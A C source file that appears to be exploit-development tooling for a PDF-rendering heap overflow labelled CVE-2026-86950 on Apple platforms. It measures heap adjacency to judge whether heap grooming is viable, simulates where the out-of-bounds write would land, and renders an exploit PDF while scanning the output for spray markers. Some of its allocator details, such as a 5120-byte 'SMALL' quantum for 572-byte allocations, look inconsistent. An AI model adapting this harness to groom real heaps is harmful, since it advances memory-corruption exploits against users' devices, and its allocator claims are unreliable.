// CVE-2026-86950 debug harness — SMALL magazine heap layout verification.
//
// Verifies that sequential malloc(572) allocations land in the SMALL
// magazine with 5120-byte quantum and are perfectly adjacent. This is
// the heap layout the exploit depends on (even though the actual OOB
// write only fires on unpatched iOS).
//
// Usage:
//   ./render_debug neg_tx_exploit.pdf
//   MallocGuardEdges=1 ./render_debug neg_tx_exploit.pdf
//   DYLD_INSERT_LIBRARIES=/usr/lib/libgmalloc.dylib ./render_debug neg_tx_exploit.pdf

#include <ImageIO/ImageIO.h>
#include <CoreGraphics/CoreGraphics.h>
#include <malloc/malloc.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <execinfo.h>

#define BUF_SIZE    572     // coverage buffer size (N=10, DX=2)
#define QUANTUM     5120    // expected SMALL magazine quantum
#define NUM_ALLOCS  32      // number of test allocations

static void fault_handler(int sig, siginfo_t *info, void *ctx) {
    fprintf(stderr, "\n=== FAULT: %s at %p ===\n",
            sig == SIGSEGV ? "SIGSEGV" : sig == SIGBUS ? "SIGBUS" : "SIGABRT",
            info->si_addr);
    void *bt[16];
    int n = backtrace(bt, 16);
    backtrace_symbols_fd(bt, n, 2);
    _exit(42);
}

static void verify_heap_layout(void) {
    fprintf(stderr, "\n=== SMALL Magazine Layout Verification ===\n");
    fprintf(stderr, "Allocating %d × %d bytes (expected quantum: %d)\n\n",
            NUM_ALLOCS, BUF_SIZE, QUANTUM);

    void *allocs[NUM_ALLOCS];
    for (int i = 0; i < NUM_ALLOCS; i++) {
        allocs[i] = malloc(BUF_SIZE);
        memset(allocs[i], 0x41 + (i % 26), BUF_SIZE);
    }

    int adjacent_count = 0;
    int quantum_match = 0;
    for (int i = 1; i < NUM_ALLOCS; i++) {
        ptrdiff_t delta = (char *)allocs[i] - (char *)allocs[i-1];
        size_t real_size = malloc_size(allocs[i]);

        if (i <= 8 || i == NUM_ALLOCS - 1) {
            fprintf(stderr, "  alloc[%2d]: %p  size=%zu  delta=%+ld\n",
                    i, allocs[i], real_size, (long)delta);
        }

        if (delta == QUANTUM) {
            adjacent_count++;
            quantum_match++;
        } else if (delta > 0 && delta < QUANTUM * 2) {
            adjacent_count++;
        }
    }

    fprintf(stderr, "\n  Sequential adjacency: %d/%d (%.0f%%)\n",
            adjacent_count, NUM_ALLOCS - 1,
            100.0 * adjacent_count / (NUM_ALLOCS - 1));
    fprintf(stderr, "  Exact quantum match (%d bytes): %d/%d (%.0f%%)\n",
            QUANTUM, quantum_match, NUM_ALLOCS - 1,
            100.0 * quantum_match / (NUM_ALLOCS - 1));

    if (quantum_match > (NUM_ALLOCS - 1) * 0.8) {
        fprintf(stderr, "  HEAP LAYOUT: PREDICTABLE — feng shui viable\n");
    } else {
        fprintf(stderr, "  HEAP LAYOUT: variable — may need larger spray\n");
    }

    // Simulate the OOB: check what's at allocs[15] + 5120 (should be allocs[16])
    if (NUM_ALLOCS > 16) {
        char *oob_target = (char *)allocs[15] + QUANTUM;
        ptrdiff_t to_next = (char *)allocs[16] - oob_target;
        fprintf(stderr, "\n  OOB simulation: allocs[15]+%d → %+ld bytes from allocs[16]\n",
                QUANTUM, (long)to_next);
        if (to_next == 0) {
            fprintf(stderr, "  PERFECT: OOB would hit byte 0 of allocs[16]\n");
        }
    }

    for (int i = 0; i < NUM_ALLOCS; i++) free(allocs[i]);
}

static void render_pdf(const char *path) {
    CFURLRef url = CFURLCreateFromFileSystemRepresentation(
        NULL, (const UInt8 *)path, strlen(path), false);
    CGImageSourceRef src = CGImageSourceCreateWithURL(url, NULL);
    CFRelease(url);
    if (!src) {
        fprintf(stderr, "CGImageSourceCreateWithURL failed\n");
        return;
    }

    int sz = 256;
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue,
                        CFNumberCreate(NULL, kCFNumberIntType, &sz) };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k,
        (const void **)v, 2, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);

    fprintf(stderr, "\n=== Rendering PDF ===\n");
    CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);

    if (img) {
        size_t w = CGImageGetWidth(img);
        size_t h = CGImageGetHeight(img);
        fprintf(stderr, "Thumbnail: %zux%zu\n", w, h);

        CGDataProviderRef dp = CGImageGetDataProvider(img);
        CFDataRef data = CGDataProviderCopyData(dp);
        if (data) {
            const UInt8 *pixels = CFDataGetBytePtr(data);
            CFIndex len = CFDataGetLength(data);

            int marker_found = 0;
            for (CFIndex i = 0; i < len - 4; i++) {
                if (pixels[i] == 0xCA && pixels[i+1] == 0xFE &&
                    pixels[i+2] == 0xBA && pixels[i+3] == 0xBE) {
                    fprintf(stderr, "MARKER at pixel offset %ld\n", (long)i);
                    marker_found = 1;
                }
            }
            if (!marker_found)
                fprintf(stderr, "No spray markers in pixel data\n");

            CFRelease(data);
        }
        CGImageRelease(img);
    } else {
        fprintf(stderr, "Thumbnail creation returned NULL\n");
    }

    CFRelease(src);
    CFRelease(opts);
}

int main(int argc, char **argv) {
    const char *path = argc > 1 ? argv[1] : "neg_tx_exploit.pdf";

    struct sigaction sa = {0};
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    sigaction(SIGABRT, &sa, NULL);

    fprintf(stderr, "=== CVE-2026-86950 Heap Layout Verifier ===\n");
    fprintf(stderr, "PDF: %s\n", path);
    fprintf(stderr, "Coverage buffer: %d bytes, quantum: %d bytes\n", BUF_SIZE, QUANTUM);
    fprintf(stderr, "OOB: +%d bytes forward (byte 0 of next allocation)\n", QUANTUM);

    verify_heap_layout();
    render_pdf(path);

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
